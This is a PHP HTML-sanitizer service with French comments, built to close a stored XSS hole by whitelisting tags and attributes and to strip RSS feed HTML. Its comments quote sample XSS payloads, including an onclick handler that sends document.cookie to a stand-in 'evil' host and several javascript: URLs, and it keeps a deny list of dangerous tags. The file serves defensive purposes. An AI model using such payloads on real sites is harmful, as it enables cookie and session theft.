<?php

declare(strict_types=1);

namespace App\Service;

/**
 * HtmlSanitizerService — Nettoyage du HTML provenant de sources externes ou d'une
 * saisie utilisateur, avant persistance en base.
 *
 * Ce service expose DEUX stratégies de nettoyage distinctes, choisies selon le besoin :
 *
 *   - sanitize()          → STRIP TOTAL. Aucun tag HTML ne survit (texte brut).
 *                            Utilisé pour les flux RSS/Atom (cf. ADR-0006) : la
 *                            description n'est jamais affichée en HTML ni réutilisée
 *                            comme telle, un strip complet est donc la stratégie la
 *                            plus sûre et la plus simple.
 *
 *   - sanitizeRichText()  → LISTE BLANCHE stricte (<p><ul><li><strong><a><br>) avec
 *                            suppression de TOUS les attributs dangereux (via
 *                            DOMDocument, pas simple strip_tags()). Utilisé pour
 *                            resource.description (soumission artiste/structure ET
 *                            conversion ScrapedResource → Resource par un admin),
 *                            correctif de la faille XSS stockée (audit sécurité,
 *                            juillet 2026) — cf. ResourceService::createResource()
 *                            et AdminController::verifyScrapedOpportunity().
 *
 * Aucune dépendance externe (pas de composant symfony/html-sanitizer, écarté par
 * l'ADR-0006 pour le cas RSS ; DOMDocument est une extension PHP native, pas un
 * package Composer, donc ce choix reste cohérent avec cette décision).
 *
 * ── POURQUOI strip TOTAL des tags ? ──────────────────────────────────────────
 * Les flux RSS proviennent de sites tiers dont on ne contrôle pas le contenu.
 * Un flux malveillant ou mal configuré pourrait injecter :
 *   - des balises <script> → exécution de code JavaScript dans un contexte admin
 *   - des balises <img> avec src externe → tracking pixel, SSRF
 *   - des balises <a href="javascript:..."> → XSS
 *
 * En V1, la description n'est PAS un champ affiché tel quel dans Twig —
 * elle passe d'abord dans ce service, puis dans l'admin (contexte déjà protégé).
 * Mais surtout, elle peut alimenter un prompt LLM (LlmExtractorService).
 * Injecter du HTML brut dans un prompt = risque de prompt injection.
 * Le strip total est la seule garantie robuste.
 *
 * ── POURQUOI la troncature à 2000 caractères ? ──────────────────────────────
 * La colonne `description` de scraped_resources est un TEXT (illimité en SQL),
 * MAIS les descriptions de flux RSS ne valent pas la peine d'être stockées en
 * intégralité (elles peuvent atteindre plusieurs milliers de caractères de HTML
 * qui, une fois strippé, devient moins long mais reste parfois verbeux).
 * De plus, si la description est passée à un LLM (Mistral ou Anthropic),
 * chaque token coûte. Tronquer à 2000 caractères limite le coût API tout
 * en conservant l'essentiel du contenu informatif.
 *
 * ── CLASSE vs INTERFACE ? ────────────────────────────────────────────────────
 * On crée une classe concrète directement (pas d'interface) car :
 *   - Ce comportement n'a pas de variante : un strip total ne se remplace pas
 *     par un autre strip total avec des paramètres différents.
 *   - Le composant symfony/html-sanitizer (qui aurait une interface) est
 *     explicitement écarté (décision A1 du brief) pour garder une dépendance légère.
 */
class HtmlSanitizerService
{
    /**
     * Nettoie une chaîne HTML provenant d'une source externe.
     *
     * Étapes appliquées dans l'ordre :
     *   1. strip_tags()         → supprime TOUS les tags HTML (aucun autorisé)
     *   2. html_entity_decode() → décode &amp; → &, &lt; → <, &rsquo; → ', etc.
     *   3. Normalisation des espaces → trim + collapse des espaces multiples/sauts de ligne
     *   4. mb_substr()          → troncature multi-octets à $maxLength caractères
     *
     * @param string $html      Le HTML brut à nettoyer (peut être vide)
     * @param int    $maxLength Longueur maximale de la chaîne résultante (défaut 2000)
     *
     * @return string Le texte nettoyé, sans aucun tag HTML, prêt pour la BDD ou un LLM
     */
    public function sanitize(string $html, int $maxLength = 2000): string
    {
        // ── Étape 1 : suppression TOTALE des tags HTML ───────────────────────
        // strip_tags() sans second argument = aucun tag autorisé.
        // Contrairement à htmlspecialchars_decode(), strip_tags() supprime AUSSI
        // les attributs (href, onclick, src...) qui pourraient contenir du code.
        $text = strip_tags($html);

        // ── Étape 2 : décodage des entités HTML ──────────────────────────────
        // Après strip_tags(), le texte peut encore contenir des entités encodées :
        // "&amp;" au lieu de "&", "&lt;" au lieu de "<", "&rsquo;" au lieu de "'"
        // Ces entités viennent du HTML original et doivent être converties en
        // caractères lisibles pour un stockage propre en BDD.
        //
        // ENT_QUOTES : décode les apostrophes (&apos;, &#39;) et guillemets (&quot;)
        // ENT_HTML5  : prend en charge toutes les entités nommées HTML5 (&rsquo;, &ldquo;...)
        // 'UTF-8'    : obligatoire pour les caractères multi-octets (é, à, ç, etc.)
        $text = html_entity_decode($text, ENT_QUOTES | ENT_HTML5, 'UTF-8');

        // ── Étape 3 : normalisation des espaces ──────────────────────────────
        // strip_tags() laisse les sauts de ligne (<br> → \n) et les espaces
        // multiples qui encadraient les tags.
        // On normalise : sauts de ligne et tabulations → espace, puis collapse.
        //
        // Exemple avant : "  Titre\n  \n  Corps du texte   "
        // Exemple après : "Titre Corps du texte"
        //
        // preg_replace() en sécurité : /\s+/ avec le flag Unicode \s couvre
        // l'espace, \t, \n, \r, \f, \v — ce qui correspond à tous les séparateurs
        // qu'un flux RSS mal formaté peut injecter.
        $text = trim((string) preg_replace('/\s+/', ' ', $text));

        // ── Étape 4 : troncature multi-octets ───────────────────────────────
        // On utilise mb_substr() plutôt que substr() pour éviter de couper au
        // milieu d'un caractère multi-octets (ex: "é" = 2 octets en UTF-8).
        // substr("élan", 0, 1) retournerait un byte invalide → caractère corrompu.
        // mb_substr("élan", 0, 1) retourne correctement "é".
        if (mb_strlen($text) > $maxLength) {
            $text = mb_substr($text, 0, $maxLength);
        }

        return $text;
    }

    /**
     * Liste blanche des tags HTML autorisés par sanitizeRichText().
     *
     * Ces 6 tags couvrent exactement ce dont on a besoin pour une description
     * éditoriale simple (paragraphes, listes, emphase, lien, saut de ligne) —
     * c'est aussi la liste imposée au LLM dans le prompt d'enrichissement
     * (cf. OpportunityEnrichmentService), donc aucune balise « légitime »
     * produite par le pipeline IA n'est perdue en passant par ce sanitizer.
     */
    private const ALLOWED_TAGS = ['p', 'ul', 'li', 'strong', 'a', 'br'];

    /**
     * Tags intrinsèquement dangereux : on les supprime ENTIÈREMENT (tag + contenu),
     * contrairement aux autres tags non autorisés qu'on se contente de "déplier"
     * (cf. sanitizeNode()). Un <script>...</script> ou <style>...</style> n'a aucun
     * intérêt à être affiché comme texte brut — autant le retirer complètement.
     */
    private const STRIPPED_TAGS = ['script', 'style', 'iframe', 'object', 'embed', 'svg', 'math', 'noscript'];

    /**
     * Nettoie un HTML "riche" produit par un utilisateur (soumission artiste/structure)
     * ou par le pipeline IA (LLM), en ne conservant qu'une liste blanche stricte de
     * balises éditoriales : <p>, <ul>, <li>, <strong>, <a>, <br>.
     *
     * ── POURQUOI PAS strip_tags($html, '<p><ul>...') ? ──────────────────────────
     * strip_tags() avec une liste blanche supprime bien les balises non autorisées,
     * mais NE TOUCHE PAS aux attributs des balises qui restent : un payload du type
     * `<p onclick="fetch('https://evil/'+document.cookie)">` passerait intact, car
     * <p> est autorisé et strip_tags() ne sait pas retirer un attribut. C'est
     * exactement le type de faille qu'on doit fermer ici (XSS stocké).
     *
     * On utilise donc DOMDocument pour reconstruire l'arbre HTML nœud par nœud :
     *   1. Les tags dangereux (STRIPPED_TAGS) sont supprimés avec leur contenu.
     *   2. Les tags non autorisés mais inoffensifs (ex: <div>, <span>, <img>) sont
     *      "dépliés" : on garde leur contenu texte, mais pas la balise elle-même.
     *   3. Les tags autorisés (ALLOWED_TAGS) sont conservés, mais TOUS leurs
     *      attributs sont supprimés — sauf `href` sur <a>, qui est validé
     *      séparément (cf. sanitizeAttributes()) pour bloquer les schémas
     *      dangereux (javascript:, data:, vbscript:...).
     *
     * ── UTILISATION ──────────────────────────────────────────────────────────────
     * Appelé à l'ÉCRITURE, avant persistance, sur TOUTE description de Resource
     * (soumission artiste/structure via ResourceService, conversion ScrapedResource
     * → Resource par un admin). Le template resource/show.html.twig peut ensuite
     * afficher resource.description via `|raw` en toute sécurité, PUISQUE le HTML
     * stocké en base est garanti conforme à cette liste blanche.
     *
     * @param string $html      HTML brut à nettoyer (soumission utilisateur ou sortie LLM)
     * @param int    $maxLength Longueur maximale du TEXTE VISIBLE du résultat (garde-fou
     *                          anti-abus, 20000 caractères ≈ plusieurs pages de texte,
     *                          largement suffisant pour une description d'opportunité).
     *                          NB : porte sur le texte contenu dans les balises, pas sur
     *                          la longueur de la chaîne HTML sérialisée (qui inclut les
     *                          balises) — voir truncateTreeToBudget() pour le pourquoi.
     *
     * @return string HTML nettoyé, ne contenant plus que des balises de ALLOWED_TAGS
     *                sans aucun attribut dangereux
     */
    public function sanitizeRichText(string $html, int $maxLength = 20000): string
    {
        // ── Garde-fou anti-DoS : on plafonne l'ENTRÉE brute AVANT loadHTML() ────
        // (défense en profondeur, audit sécurité juillet 2026)
        //
        // Jusqu'ici, la seule troncature appliquée l'était sur la SORTIE, une fois
        // le HTML déjà parsé par DOMDocument. Or DOMDocument::loadHTML() doit,
        // pour construire son arbre, traiter l'intégralité du document fourni —
        // y compris un nesting profond (ex : des milliers de <div><div>...</div></div>
        // imbriqués), ce qui peut coûter cher en CPU/mémoire AVANT même qu'on ait
        // eu l'occasion de tronquer quoi que ce soit. On ne veut pas dépendre du
        // comportement implicite de libxml face à une entrée pathologique : on
        // borne donc explicitement la taille de l'entrée AVANT le parsing.
        //
        // 100 000 caractères ≈ 5x la limite de sortie (20 000) : largement assez
        // pour laisser passer un HTML riche légitime (soumission artiste/structure,
        // sortie LLM), tout en bloquant un payload volontairement démesuré.
        if (mb_strlen($html) > 100000) {
            $html = mb_substr($html, 0, 100000);
        }

        $html = trim($html);
        if ($html === '') {
            return '';
        }

        // DOMDocument attend un document HTML complet ; on enveloppe notre fragment
        // dans un <div> pour pouvoir ensuite n'en récupérer que le contenu interne.
        //
        // ATTENTION : on ne peut PAS écrire le prologue XML complet ici en commentaire
        // PHP — la séquence "point d'interrogation + chevron fermant" termine un
        // commentaire `//` de façon anticipée (comportement PHP documenté), ce qui
        // corromprait le reste du fichier. D'où cette périphrase.
        //
        // On préfixe donc le fragment par un prologue XML factice déclarant l'encodage
        // UTF-8 — astuce classique pour forcer libxml à interpréter l'entrée en UTF-8
        // (sinon il utilise ISO-8859-1 par défaut et corrompt les caractères accentués :
        // "é" devient "Ã©").
        $wrapped = '<?xml encoding="utf-8"?><div>' . $html . '</div>';

        // Le HTML fourni par un utilisateur ou un LLM n'est pas forcément un HTML
        // valide (balises non fermées, imbrication incorrecte...). libxml lève des
        // warnings dans ce cas ; on les capture pour ne pas polluer les logs, sans
        // pour autant faire échouer le nettoyage (DOMDocument fait de son mieux
        // pour réparer le HTML malformé, ce qui est le comportement souhaité ici).
        $dom = new \DOMDocument();
        $previousSetting = libxml_use_internal_errors(true);
        $dom->loadHTML(
            $wrapped,
            LIBXML_HTML_NOIMPLIED | LIBXML_HTML_NODEFDTD
        );
        libxml_clear_errors();
        libxml_use_internal_errors($previousSetting);

        $root = $dom->getElementsByTagName('div')->item(0);
        if ($root === null) {
            // Ne devrait jamais arriver (on a toujours enveloppé dans un <div>),
            // mais on retourne une chaîne vide plutôt que de risquer un crash.
            return '';
        }

        $this->sanitizeNode($dom, $root);

        // ── Troncature de la SORTIE : au niveau de l'ARBRE, pas de la chaîne ────
        // (défense en profondeur, audit sécurité juillet 2026)
        //
        // AVANT : on sérialisait tout l'arbre puis on coupait la chaîne résultante
        // avec mb_substr($result, 0, $maxLength). Problème : rien ne garantit que
        // la coupe tombe entre deux balises — elle peut tomber EN PLEIN MILIEU
        // d'un tag ("<stro" sans fermeture, ou un <a href="..."> jamais fermé),
        // ce qui produirait un fragment HTML invalide stocké en base puis affiché
        // via `|raw` dans le template (resource/show.html.twig).
        //
        // MAINTENANT : on tronque directement l'ARBRE DOM (truncateTreeToBudget()
        // ci-dessous) en ne rognant QUE le contenu des nœuds texte, et en retirant
        // entièrement les nœuds qui dépasseraient le budget. DOMDocument::saveHTML()
        // ne peut alors sérialiser QUE des balises entièrement ouvertes et fermées :
        // le résultat est structurellement toujours un HTML bien formé, quel que
        // soit l'endroit où la coupe tombe.
        //
        // NB : le budget ($maxLength) porte ici sur la longueur du TEXTE visible
        // (le contenu des nœuds texte), pas sur la longueur de la chaîne HTML
        // sérialisée (qui inclut les balises). C'est un léger changement de
        // sémantique par rapport à l'ancien comportement, mais c'est le prix à
        // payer pour ne jamais couper une balise — et le texte visible est de
        // toute façon ce qui compte réellement pour l'utilisateur/le LLM.
        $budget = $maxLength;
        $this->truncateTreeToBudget($root, $budget);

        // On sérialise chaque enfant du <div> racine (et non le <div> lui-même,
        // qui n'est qu'un conteneur technique introduit pour le parsing).
        $result = '';
        foreach (iterator_to_array($root->childNodes) as $child) {
            $result .= $dom->saveHTML($child);
        }

        $result = trim($result);

        return $result;
    }

    /**
     * Parcourt récursivement les enfants d'un nœud DOM et applique la liste
     * blanche : supprime les tags dangereux, déplie les tags non autorisés
     * (en gardant leur contenu), et nettoie les attributs des tags autorisés.
     *
     * @param \DOMDocument $dom  Le document (nécessaire pour insertBefore/removeChild)
     * @param \DOMNode     $node Le nœud parent dont on nettoie les enfants
     */
    private function sanitizeNode(\DOMDocument $dom, \DOMNode $node): void
    {
        // iterator_to_array() : on fige la liste des enfants AVANT de la parcourir,
        // car on va modifier l'arbre (removeChild/insertBefore) pendant la boucle.
        // Itérer directement sur $node->childNodes pendant qu'on le modifie donnerait
        // des résultats imprévisibles (DOMNodeList est une vue "live" sur l'arbre).
        foreach (iterator_to_array($node->childNodes) as $child) {
            if ($child instanceof \DOMText) {
                // Texte brut : rien à nettoyer, on le laisse tel quel.
                // NB : DOMCdataSection étend DOMText en PHP (hiérarchie DOMNode →
                // DOMCharacterData → DOMText → DOMCdataSection), donc ce seul test
                // couvre aussi les sections CDATA — pas besoin d'un test séparé.
                continue;
            }

            if (!$child instanceof \DOMElement) {
                // Commentaires (<!-- -->), instructions de traitement, etc. :
                // aucune utilité éditoriale, on les supprime par précaution.
                $node->removeChild($child);
                continue;
            }

            $tagName = strtolower($child->tagName);

            if (in_array($tagName, self::STRIPPED_TAGS, true)) {
                // Tag dangereux : on retire le tag ET tout son contenu.
                $node->removeChild($child);
                continue;
            }

            if (!in_array($tagName, self::ALLOWED_TAGS, true)) {
                // Tag non autorisé mais inoffensif (ex: <div>, <span>, <img>, <table>) :
                // on nettoie d'abord récursivement ses enfants, puis on "déplie" le
                // tag en remontant ses enfants au niveau du parent (le tag lui-même
                // disparaît, mais son contenu texte est conservé).
                $this->sanitizeNode($dom, $child);
                while ($child->firstChild !== null) {
                    $node->insertBefore($child->firstChild, $child);
                }
                $node->removeChild($child);
                continue;
            }

            // Tag autorisé : on nettoie ses attributs (voir sanitizeAttributes())
            // puis on descend nettoyer récursivement ses propres enfants.
            $this->sanitizeAttributes($child, $tagName);
            $this->sanitizeNode($dom, $child);
        }
    }

    /**
     * Tronque un arbre DOM déjà nettoyé pour que la longueur totale de son texte
     * visible ne dépasse pas $budget, SANS JAMAIS couper une balise en plein
     * milieu (contrairement à un mb_substr() appliqué après sérialisation).
     *
     * Principe : on parcourt les nœuds dans l'ordre du document en consommant le
     * budget au fur et à mesure.
     *   - Un nœud texte dont le contenu tient dans le budget restant : on le
     *     garde tel quel et on décrémente le budget.
     *   - Un nœud texte trop long : on tronque SA DONNÉE (DOMText::$data), ce qui
     *     reste une opération sûre — un nœud texte n'a pas de "balise" à couper.
     *   - Un nœud élément (ex: <p>, <a>...) : on descend récursivement nettoyer
     *     SES enfants avec le même budget. La balise elle-même (ouverture +
     *     fermeture) est toujours préservée intacte par saveHTML(), quel que
     *     soit ce qu'il reste à l'intérieur (même si son contenu textuel est
     *     entièrement vidé, on obtient au pire une balise vide comme <p></p>,
     *     jamais une balise tronquée).
     *   - Budget épuisé : les nœuds suivants (frères restants) sont retirés
     *     entièrement de l'arbre — ils ne seront jamais sérialisés.
     *
     * @param \DOMNode $node   Nœud dont on tronque les ENFANTS (jamais lui-même)
     * @param int      $budget Nombre de caractères de texte encore autorisés
     *                         (passé par référence : décrémenté au fil du parcours,
     *                         partagé entre tous les niveaux de récursion)
     */
    private function truncateTreeToBudget(\DOMNode $node, int &$budget): void
    {
        // iterator_to_array() : même raison que dans sanitizeNode(), on modifie
        // l'arbre (removeChild) pendant qu'on le parcourt.
        foreach (iterator_to_array($node->childNodes) as $child) {
            if ($budget <= 0) {
                // Budget déjà épuisé par un nœud précédent : on retire ce nœud
                // (et tout son sous-arbre) entièrement, plutôt que de risquer
                // une sérialisation partielle.
                $node->removeChild($child);
                continue;
            }

            if ($child instanceof \DOMText) {
                $text = $child->data;
                $len = mb_strlen($text);
                if ($len <= $budget) {
                    $budget -= $len;
                } else {
                    // On tronque la DONNÉE du nœud texte, pas une chaîne HTML
                    // sérialisée : aucune balise n'est concernée par cette coupe.
                    $child->data = mb_substr($text, 0, $budget);
                    $budget = 0;
                }
                continue;
            }

            if ($child instanceof \DOMElement) {
                // On descend consommer le budget dans les enfants de ce tag ;
                // la balise <ouvrante>...</fermante> elle-même reste toujours
                // intacte, même si son contenu se retrouve vidé ou raccourci.
                $this->truncateTreeToBudget($child, $budget);
                continue;
            }

            // Autres types de nœuds (commentaires...) : normalement déjà
            // supprimés par sanitizeNode(), mais on les ignore par précaution
            // sans consommer de budget.
        }
    }

    /**
     * Nettoie les attributs d'un tag autorisé.
     *
     * Règle générale : AUCUN tag autorisé n'a besoin d'attribut, à l'exception de
     * `href` sur <a>. On supprime donc systématiquement tout le reste (class, id,
     * style, et surtout les gestionnaires d'événements onclick/onerror/onload...).
     *
     * @param \DOMElement $element Le tag à nettoyer (déjà vérifié comme autorisé)
     * @param string      $tagName Nom du tag en minuscules (évite de le relire)
     */
    private function sanitizeAttributes(\DOMElement $element, string $tagName): void
    {
        // iterator_to_array() : même raison que dans sanitizeNode(), on ne peut pas
        // supprimer des attributs tout en itérant directement sur la DOMNamedNodeMap.
        foreach (iterator_to_array($element->attributes) as $attr) {
            if ($tagName === 'a' && $attr->name === 'href') {
                // Traité séparément ci-dessous (validation du schéma de l'URL).
                continue;
            }
            $element->removeAttribute($attr->name);
        }

        if ($tagName !== 'a') {
            return;
        }

        $href = $element->getAttribute('href');

        // On n'autorise QUE les liens http:// et https://. Ça bloque en particulier :
        //   - javascript:alert(document.cookie)   → exécution de code au clic
        //   - data:text/html;base64,...            → contenu arbitraire encodé
        //   - vbscript:...                          → variante IE historique
        // Une regex ancrée en début de chaîne (^) est nécessaire : sans elle, une
        // URL comme "https://evil.com/javascript:..." passerait le test à tort si
        // on cherchait juste l'absence du mot "javascript" n'importe où dans l'URL.
        if ($href === '' || !preg_match('#^https?://#i', $href)) {
            $element->removeAttribute('href');
        } else {
            // rel="noopener noreferrer" : empêche la page ouverte dans le nouvel onglet
            // d'accéder à `window.opener` (protection anti tabnabbing).
            // target="_blank" : cohérent avec les autres liens externes du template
            // (cf. resource/show.html.twig, boutons "Candidater" / "En savoir plus").
            $element->setAttribute('target', '_blank');
            $element->setAttribute('rel', 'noopener noreferrer');
        }
    }
}
